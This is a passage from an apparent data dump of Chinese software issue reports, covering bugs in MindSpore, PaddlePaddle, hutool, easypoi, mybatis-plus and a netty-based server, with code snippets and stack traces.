TrapzMock(inputs=[input_x1, None, 1.0, 31]) fact.forward_cmp() def test_trapz_input_support_bool_error(): input_x = Tensor(np.array([[1., 1., 1.], [1., 1., 1.], [1., 1., 1.]]).astype(np.float32)) fact = TrapzMock(inputs=[input_x, (1, 2, 3), True, 1]) fact.forward_cmp()"
认证中心 和 数据库解耦，通过feign 调用数据源,"环境信息 pigx版本: 3.11 是否修改包名: 否   <code>: @FeignClient(contextId = ""remoteClientDetailsService"", value = ServiceNameConstants.UPMS_SERVICE) public interface RemoteClientDetailsService { /** * 通过clientId 查询客户端信息 * @param clientId 用户名 * @param from 调用标志 * @return R */ @GetMapping(""/client/getClientDetailsById/{clientId}"") R&lt;SysOauthClientDetails&gt; getClientDetailsById(@PathVariable(""clientId"") String clientId, @RequestHeader(SecurityConstants.FROM) String from); } ![1607310068](https://minio.pigx.vip/oss/1607310068.png)"
Excel隐藏sheet失败,"JDK版本： JDK8_251 hutool版本： 5.1.3 用wps打开Excel，sheet是隐藏成功的。而用Office打开则sheet是隐藏失败的。   <code>: writer.getWorkbook().setSheetHidden(0, true);"
【众智】【计算-GPU开发】ApplyAdagradV2,根据 adagradv2 算法公式更新参数 https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/ApplyAdagradV2?hl=zh-cn 3. 异常处理 4. 算子反向   <code>: class ApplyAdagradV2(PrimitiveWithInfer):
Remove rows_per_buffer from MD,"Task Description After replacing DataBuffer with TensorRows as items between DatasetOps, is no longer used. This task is to remove and all its usages.   <code>: rows_per_buffer rows_per_buffer"
字符串截取时考虑的情况不全面导致的BUG,"在这个方法中cn.afterturn.easypoi.cache.ImageCache#getImage 因为 这个截取的方法当imagePath中带有.的时候不导致写流不成功 复现方式: 文件把图片放到名为com.xxx的文件夹下例如 /com.xxx/a.jpg   <code>: ImageIO.write(bufferImg, imagePath.substring(imagePath.indexOf(""."") + 1, imagePath.length()), byteArrayOut);"
[MDT][FUNC]音频算子LFCC参数n_filter、n_lfcc参数值为0时，n_filter参数取最大值2147483647时报错,"[MDT][FUNC]音频算子LFCC参数n_filter、n_lfcc参数值为0时，n_filter参数取最大值2147483647时报错 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : MindSpore 1.9.0 commit_id = ''[sha1]:baf7c96a,[branch]:(HEAD,mr-origin-40833)'' -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 18.04.2 -- GCC/Compiler version : gcc (GCC) 7.3.0 (/): 执行关联用例 test pass   <code>: def test_func_lfcc_009(): """""" 测试lfcc算子参数n_filter为 0 """""" dataset = np.random.randn(10, 30) lcff_op = audio.LFCC(n_filter=0) lcff_op(dataset) def test_func_lfcc_013(): """""" 测试lfcc算子参数n_lfcc为0 """""" dataset = np.random.randn(10, 30) lcff_op = audio.LFCC(n_lfcc=0) lcff_op(dataset) def test_func_lfcc_010(): """""" 测试lfcc算子参数n_filter为2147483647 """""" dataset = np.random.randn(10, 30) lcff_op = audio.LFCC(n_filter=2147483647) lcff_op(dataset) (zxl) root@huawei:LFCC# pytest -s test_func_lfcc.py::test_func_lfcc_009 =================================================================== test session starts =================================================================== platform linux -- Python 3.7.5, pytest-5.3.2, py-1.8.1, pluggy-0.13.1 rootdir: /data/zxl/zhongzhi/LFCC collecting ... [WARNING] MD(5594,7ff081e68740,python):2022-09-30-09:34:11.547.390 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/acl_adapter.cc:38] InitPlugin] Dlopen libdvpp_utils.so failed, result = libdvpp_utils.so: cannot open shared object file: No such file or directory, it can be ignored if not running on ascend. collected 1 item test_func_lfcc.py Fatal Python error: Segmentation fault Current thread 0x00007ff081e68740 (most recent call first): File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/mindspore/dataset/transforms/transforms.py"", line 67 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/mindspore/dataset/audio/transforms.py"", line 52 in __call__ File ""/data/zxl/zhongzhi/LFCC/test_func_lfcc.py"", line 111 in test_func_lfcc_009 File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/python.py"", line 166 in pytest_pyfunc_call File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/python.py"", line 1435 in runtest File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 131 in pytest_runtest_call File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 207 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 234 in from_call File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 207 in call_runtest_hook File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 182 in call_and_report File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 96 in runtestprotocol File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 81 in pytest_runtest_protocol File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 270 in pytest_runtestloop File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 246 in _main File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 196 in wrap_session File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 239 in pytest_cmdline_main File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 92 in main File ""/root/miniconda3/envs/zxl/bin/pytest"", line 8 in &lt;module&gt; Segmentation fault (core dumped) (zxl) root@huawei:LFCC# pytest -s test_func_lfcc.py::test_func_lfcc_013 =================================================================== test session starts =================================================================== platform linux -- Python 3.7.5, pytest-5.3.2, py-1.8.1, pluggy-0.13.1 rootdir: /data/zxl/zhongzhi/LFCC collecting ... [WARNING] MD(5701,7f1fccf97740,python):2022-09-30-09:34:15.185.084 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/acl_adapter.cc:38] InitPlugin] Dlopen libdvpp_utils.so failed, result = libdvpp_utils.so: cannot open shared object file: No such file or directory, it can be ignored if not running on ascend. collected 1 item test_func_lfcc.py Fatal Python error: Segmentation fault Current thread 0x00007f1fccf97740 (most recent call first): File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/mindspore/dataset/transforms/transforms.py"", line 67 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/mindspore/dataset/audio/transforms.py"", line 52 in __call__ File ""/data/zxl/zhongzhi/LFCC/test_func_lfcc.py"", line 148 in test_func_lfcc_013 File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/python.py"", line 166 in pytest_pyfunc_call File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/python.py"", line 1435 in runtest File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 131 in pytest_runtest_call File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 207 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 234 in from_call File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 207 in call_runtest_hook File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 182 in call_and_report File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 96 in runtestprotocol File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/runner.py"", line 81 in pytest_runtest_protocol File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 270 in pytest_runtestloop File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 246 in _main File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 196 in wrap_session File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/main.py"", line 239 in pytest_cmdline_main File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/zxl/lib/python3.7/site-packages/_pytest/config/__init__.py"", line 92 in main File ""/root/miniconda3/envs/zxl/bin/pytest"", line 8 in &lt;module&gt; Segmentation fault (core dumped) (zxl) root@huawei:LFCC# pytest -s test_func_lfcc.py::test_func_lfcc_010 =================================================================== test session starts =================================================================== platform linux -- Python 3.7.5, pytest-5.3.2, py-1.8.1, pluggy-0.13.1 rootdir: /data/zxl/zhongzhi/LFCC collecting ... [WARNING] MD(13241,7f60c3ef3740,python):2022-09-30-09:36:03.832.728 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/acl_adapter.cc:38] InitPlugin] Dlopen libdvpp_utils.so failed, result = libdvpp_utils.so: cannot open shared object file: No such file or directory, it can be ignored if not running on ascend. collected 1 item test_func_lfcc.py F ======================================================================== FAILURES ========================================================================= ___________________________________________________________________ test_func_lfcc_010 ____________________________________________________________________ @pytest.mark.level('level2') def test_func_lfcc_010(): """""" 测试lfcc算子参数n_filter为2147483647 """""" dataset = np.random.randn(10, 30) lcff_op = audio.LFCC(n_filter=2147483647) &gt; lcff_op(dataset) test_func_lfcc.py:120: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ /root/miniconda3/envs/zxl/lib/python3.7/site-packages/mindspore/dataset/audio/transforms.py:52: in __call__ return super().__call__(*input_tensor_list) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.dataset.audio.transforms.LFCC object at 0x7f6078157b90&gt; input_tensor_list = (array([[-0.64021629, 1.12475312, -0.87601901, 0.76303521, 1.51243344, -0.38012655, 0.90155758, 0.5736114...19, -0.81502745, 0.03911554, -0.34186734, 1.1336321 , 0.85405744, -1.21619223, -1.30677177, 0.66251419]]),) tensor_row = [&lt;mindspore._c_dataengine.Tensor object at 0x7f607816d030&gt;] tensor = array([[-0.64021629, 1.12475312, -0.87601901, 0.76303521, 1.51243344, -0.38012655, 0.90155758, 0.57361146...7819, -0.81502745, 0.03911554, -0.34186734, 1.1336321 , 0.85405744, -1.21619223, -1.30677177, 0.66251419]]) def __call__(self, *input_tensor_list): """""" Call method. """""" # Check if Python implementation of op, or PIL input if (self.implementation == Implementation.PY) or \ (len(input_tensor_list) == 1 and is_pil(input_tensor_list[0]) and getattr(self, '_execute_py', None)): return self._execute_py(*input_tensor_list) tensor_row = [] for tensor in input_tensor_list: try: tensor_row.append(cde.Tensor(np.asarray(tensor))) except (RuntimeError, TypeError): raise TypeError(""Invalid user input. Got {}: {}, cannot be converted into tensor."" \ .format(type(tensor), tensor)) if not hasattr(self, 'callable_op_') or self.callable_op_ is None: self.callable_op_ = cde.Execute(self.parse()) &gt; output_tensor_list = self.callable_op_(tensor_row) E RuntimeError: Unexpected error. Linspace: input param n must be non-negative. E Line of code : 340 E File : mindspore/ccsrc/minddata/dataset/audio/kernels/audio_utils.h /root/miniconda3/envs/zxl/lib/python3.7/site-packages/mindspore/dataset/transforms/transforms.py:67: RuntimeError"
"后台系统: 发布文章时,文章编辑器加载错误","在后台发布文章时,文章编辑器加载不出来,界面如下:   <code>: Uncaught TypeError: Cannot set properties of undefined (setting 'pasteFilterStyle') zhyd.core.js:171 at Object.init (zhyd.core.js:171) at HTMLDocument.&lt;anonymous&gt; (publish-we:497) at j (jquery.js:3119) at Object.fireWith [as resolveWith] (jquery.js:3231) at Function.ready (jquery.js:3443) at HTMLDocument.J (jquery.js:3474)"
@Alias,"使用版本 mybatis-plus-boot-starter:2.3 User类添加注解@Alias(""user"")启动项目报错，找不到user别名 Caused by: org.apache.ibatis.type.TypeException: Could not resolve type alias 'user' 联系方式 1020920264@qq.com   <code>: 使用 @Alias(""user"") 启动项目会报错。找不到别名"
在训练包含GRUCell时GPU占用率比较低,"PaddlePaddle 2.1.0 模型结构如下，在训练时GPU占用率比较低，GPU占用率50%左右，CPU占用率30%左右，基本排除由于数据读取导致变慢的原因。所以我怀疑是不是模型结构的原因。   <code>: import paddle from paddle import nn __all__ = ['ConvStack'] class MaskConv(nn.Layer): def __init__(self): super().__init__() def forward(self, x, lengths): """""" :param x: 卷积输入，shape[B, C, D, T] :param lengths: 卷积处理过的长度，shape[B] :return: 经过填充0的结果 """""" batch_size = int(lengths.shape[0]) max_len = int(lengths.max()) seq_range = paddle.arange(0, max_len, dtype=paddle.int64) seq_range_expand = seq_range.unsqueeze(0).expand([batch_size, max_len]) seq_length_expand = lengths.unsqueeze(-1).astype(paddle.int64) masks = paddle.less_than(seq_range_expand, seq_length_expand) masks = masks.astype(x.dtype) masks = masks.unsqueeze(1).unsqueeze(1) # [B, 1, 1, T] x = x.multiply(masks) return x class ConvBn(nn.Layer): """"""带BN层的卷积 :param num_channels_in: 输入通道的大小 :type num_channels_in: int :param num_channels_out: 输出通道的大小 :type num_channels_out: int :param kernel_size: 卷积核的大小 :type kernel_size: int|tuple|list :param stride: 卷积核滑动的步数 :type stride: int|tuple|list :param padding: 填充的大小 :type padding: int|tuple|list :return: 带BN层的卷积 :rtype: nn.Layer """""" def __init__(self, num_channels_in, num_channels_out, kernel_size, stride, padding): super().__init__() assert len(kernel_size) == 2 assert len(stride) == 2 assert len(padding) == 2 self.kernel_size = kernel_size self.stride = stride self.padding = padding self.mask = MaskConv() self.conv = nn.Conv2D(num_channels_in, num_channels_out, kernel_size=kernel_size, stride=stride, padding=padding, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), data_format='NCHW') self.bn = nn.BatchNorm2D(num_channels_out, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), data_format='NCHW') self.act = nn.Hardtanh(min=0.0, max=24.0) def forward(self, x, x_len): """""" x(Tensor): audio, shape [B, C, D, T] """""" x = self.conv(x) x = self.bn(x) x = self.act(x) x_len = (x_len - self.kernel_size[1] + 2 * self.padding[1]) // self.stride[1] + 1 # 将填充部分重置为0 x = self.mask(x, x_len) return x, x_len class ConvStack(nn.Layer): """"""具有堆叠卷积层的卷积组 :param feat_size: 输入音频的特征大小 :type feat_size: int :param num_stacks: 堆叠卷积层的数量 :type num_stacks: int """""" def __init__(self, feat_size, num_stacks): super().__init__() self.feat_size = feat_size # D self.num_stacks = num_stacks out_channel = 32 self.conv_in = ConvBn(num_channels_in=1, num_channels_out=32, kernel_size=(41, 11), # [D, T] stride=(2, 3), padding=(20, 5)) conv_stacks = [] for _ in range(self.num_stacks - 1): conv_stacks.append(ConvBn(num_channels_in=32, num_channels_out=out_channel, kernel_size=(21, 11), stride=(2, 1), padding=(10, 5))) self.conv_stack = nn.LayerList(conv_stacks) # 卷积层输出的特征大小 output_height = (self.feat_size - 1) // 2 + 1 for i in range(self.num_stacks - 1): output_height = (output_height - 1) // 2 + 1 self.output_height = out_channel * output_height def forward(self, x, x_len): """""" x: shape [B, C, D, T] x_len : shape [B] """""" x, x_len = self.conv_in(x, x_len) for i, conv in enumerate(self.conv_stack): x, x_len = conv(x, x_len) return x, x_len import paddle from paddle import nn __all__ = ['RNNStack'] class MaskRNN(nn.Layer): def __init__(self): super().__init__() def forward(self, x, lengths): """""" :param x: RNN输入，shape[B, T, D] :param lengths: RNN处理过的长度，shape[B] :return: 经过填充0的结果 """""" batch_size = int(lengths.shape[0]) max_len = int(lengths.max()) seq_range = paddle.arange(0, max_len, dtype=paddle.int64) seq_range_expand = seq_range.unsqueeze(0).expand([batch_size, max_len]) seq_length_expand = lengths.unsqueeze(-1).astype(paddle.int64) masks = paddle.less_than(seq_range_expand, seq_length_expand) masks = masks.astype(x.dtype) masks = masks.unsqueeze(-1) # [B, T, 1] x = x.multiply(masks) return x class BiGRUWithBN(nn.Layer): """"""具有顺序批标准化的双向gru层。批标准化只对输入状态权值执行。 :param i_size: GRUCell的输入大小 :type i_size: int :param h_size: GRUCell的隐藏大小 :type h_size: string :return: 双向GRU层 :rtype: nn.Layer """""" def __init__(self, i_size: int, h_size: int): super().__init__() hidden_size = h_size * 3 self.mask = MaskRNN() self.fw_fc = nn.Linear(i_size, hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr()) self.fw_bn = nn.BatchNorm1D(hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), data_format='NLC') self.bw_fc = nn.Linear(i_size, hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr()) self.bw_bn = nn.BatchNorm1D(hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), data_format='NLC') self.fw_cell = nn.GRUCell(input_size=hidden_size, hidden_size=h_size, weight_ih_attr=paddle.ParamAttr(), weight_hh_attr=paddle.ParamAttr(), bias_ih_attr=paddle.ParamAttr(), bias_hh_attr=paddle.ParamAttr()) self.bw_cell = nn.GRUCell(input_size=hidden_size, hidden_size=h_size, weight_ih_attr=paddle.ParamAttr(), weight_hh_attr=paddle.ParamAttr(), bias_ih_attr=paddle.ParamAttr(), bias_hh_attr=paddle.ParamAttr()) self.fw_rnn = nn.RNN(self.fw_cell, is_reverse=False, time_major=False) # [B, T, D] self.bw_rnn = nn.RNN(self.bw_cell, is_reverse=True, time_major=False) # [B, T, D] def forward(self, x, x_len): # x, shape [B, T, D] fw_x = self.fw_bn(self.fw_fc(x)) bw_x = self.bw_bn(self.bw_fc(x)) fw_x, _ = self.fw_rnn(inputs=fw_x, sequence_length=x_len) bw_x, _ = self.bw_rnn(inputs=bw_x, sequence_length=x_len) x = paddle.concat([fw_x, bw_x], axis=-1) # 将填充部分重置为0 x = self.mask(x, x_len) return x class RNNStack(nn.Layer): """"""RNN组与堆叠双向简单RNN或GRU层 :param i_size: GRU层的输入大小 :type i_size: int :param h_size: GRU层的隐层大小 :type h_size: int :param num_stacks: 堆叠的rnn层数 :type num_stacks: int :return: RNN组的输出层 :rtype: nn.Layer """""" def __init__(self, i_size: int, h_size: int, num_stacks: int): super().__init__() rnn_stacks = [] for i in range(num_stacks): rnn_stacks.append(BiGRUWithBN(i_size=i_size, h_size=h_size)) i_size = h_size * 2 self.rnn_stacks = nn.LayerList(rnn_stacks) def forward(self, x: paddle.Tensor, x_len: paddle.Tensor): """""" x: shape [B, T, D] x_len: shpae [B] """""" for i, rnn in enumerate(self.rnn_stacks): x = rnn(x, x_len) return x from paddle import nn from model_utils.conv import ConvStack from model_utils.rnn import RNNStack __all__ = ['DeepSpeech2Model'] class DeepSpeech2Model(nn.Layer): """"""DeepSpeech2模型结构 :param feat_size: 输入的特征大小 :type feat_size: int :param dict_size: 字典的大小，用来分类输出 :type dict_size: int :param num_conv_layers: 堆叠卷积层数 :type num_conv_layers: int :param num_rnn_layers: 堆叠RNN层数 :type num_rnn_layers: int :param rnn_size: RNN层大小 :type rnn_size: int :return: DeepSpeech2模型 :rtype: nn.Layer """""" def __init__(self, feat_size, dict_size, num_conv_layers=2, num_rnn_layers=3, rnn_size=1024): super().__init__() # 卷积层堆 self.conv = ConvStack(feat_size, num_conv_layers) # RNN层堆 i_size = self.conv.output_height self.rnn = RNNStack(i_size=i_size, h_size=rnn_size, num_stacks=num_rnn_layers) # 分类输入层 self.fc = nn.Linear(rnn_size * 2, dict_size) def forward(self, audio, audio_len): """""" Args: audio (Tensor): [B, D, Tmax] audio_len (Tensor): [B, Umax] Returns: logits (Tensor): [B, T, D] x_lens (Tensor): [B] """""" # [B, D, T] -&gt; [B, C=1, D, T] x = audio.unsqueeze(1) x, x_lens = self.conv(x, audio_len) # 将数据从卷积特征映射转换为向量序列 x = x.transpose([0, 3, 1, 2]) # [B, T, C, D] x = x.reshape([0, 0, -1]) # [B, T, C*D] # 删除填充部分 x = self.rnn(x, x_lens) # [B, T, D] logits = self.fc(x) return logits, x_lens"
4.0.0版本打包后在centos7下起不起来,"很奇怪,在windows下测试没问题,打包扔到centos7下,就起不来.报一个错误. 重新拉了3.8的分支,是能启动的... 加上依赖后,还是起不来,报另一个netty的错   <code>: [main] 2021-05-24 15:43:21.616 INFO o.s.b.w.e.tomcat.TomcatWebServer - Tomcat started on port(s): 8080 (http) with context path '' [main] 2021-05-24 15:43:22.249 INFO c.farsunset.cim.BootApplication - Started BootApplication in 8.39 seconds (JVM running for 8.88) [main] 2021-05-24 15:43:22.253 INFO o.s.b.a.l.ConditionEvaluationReportLoggingListener - Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. [main] 2021-05-24 15:43:22.271 ERROR o.s.boot.SpringApplication - Application run failed java.lang.NoClassDefFoundError: io/netty/channel/epoll/EpollEventLoopGroup at com.farsunset.cim.sdk.server.handler.CIMNioSocketAcceptor.createAppEventGroup(CIMNioSocketAcceptor.java:114) at com.farsunset.cim.sdk.server.handler.CIMNioSocketAcceptor.bindAppPort(CIMNioSocketAcceptor.java:149) at com.farsunset.cim.sdk.server.handler.CIMNioSocketAcceptor.bind(CIMNioSocketAcceptor.java:125) at com.farsunset.cim.config.CIMConfig.onApplicationEvent(CIMConfig.java:86) at com.farsunset.cim.config.CIMConfig.onApplicationEvent(CIMConfig.java:22) at com.farsunset.cim.config.CIMConfig$$EnhancerBySpringCGLIB$$53b30e94.onApplicationEvent(&lt;generated&gt;) at org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:176) at org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:169) at org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:143) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:421) at org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:378) at org.springframework.boot.context.event.EventPublishingRunListener.started(EventPublishingRunListener.java:105) at org.springframework.boot.SpringApplicationRunListeners.lambda$started$5(SpringApplicationRunListeners.java:75) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.springframework.boot.SpringApplicationRunListeners.doWithListeners(SpringApplicationRunListeners.java:117) at org.springframework.boot.SpringApplicationRunListeners.doWithListeners(SpringApplicationRunListeners.java:111) at org.springframework.boot.SpringApplicationRunListeners.started(SpringApplicationRunListeners.java:75) at org.springframework.boot.SpringApplication.run(SpringApplication.java:332) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1313) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1302) at com.farsunset.cim.BootApplication.main(BootApplication.java:30) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:49) at org.springframework.boot.loader.Launcher.launch(Launcher.java:107) at org.springframework.boot.loader.Launcher.launch(Launcher.java:58) at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:88) Caused by: java.lang.ClassNotFoundException: io.netty.channel.epoll.EpollEventLoopGroup at java.net.URLClassLoader.findClass(URLClassLoader.java:382) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at org.springframework.boot.loader.LaunchedURLClassLoader.loadClass(LaunchedURLClassLoader.java:151) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ... 29 common frames omitted &lt;dependency&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-transport-native-epoll&lt;/artifactId&gt; &lt;classifier&gt;linux-x86_64&lt;/classifier&gt; &lt;version&gt;${netty.version}&lt;/version&gt; &lt;/dependency&gt; [main] 2021-05-24 16:10:35.940 INFO o.s.b.a.l.ConditionEvaluationReportLoggingListener - Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. [main] 2021-05-24 16:10:35.974 ERROR o.s.boot.SpringApplication - Application run failed java.lang.IllegalStateException: incompatible event loop type: io.netty.channel.nio.NioEventLoop at io.netty.channel.AbstractChannel$AbstractUnsafe.register(AbstractChannel.java:473) at io.netty.channel.SingleThreadEventLoop.register(SingleThreadEventLoop.java:87) at io.netty.channel.SingleThreadEventLoop.register(SingleThreadEventLoop.java:81) at io.netty.channel.MultithreadEventLoopGroup.register(MultithreadEventLoopGroup.java:86) at io.netty.bootstrap.AbstractBootstrap.initAndRegister(AbstractBootstrap.java:323) at io.netty.bootstrap.AbstractBootstrap.doBind(AbstractBootstrap.java:272) at io.netty.bootstrap.AbstractBootstrap.bind(AbstractBootstrap.java:268) at io.netty.bootstrap.AbstractBootstrap.bind(AbstractBootstrap.java:246) at com.farsunset.cim.sdk.server.handler.CIMNioSocketAcceptor.bindAppPort(CIMNioSocketAcceptor.java:164) at com.farsunset.cim.sdk.server.handler.CIMNioSocketAcceptor.bind(CIMNioSocketAcceptor.java:125) at com.farsunset.cim.config.CIMConfig.onApplicationEvent(CIMConfig.java:86) at 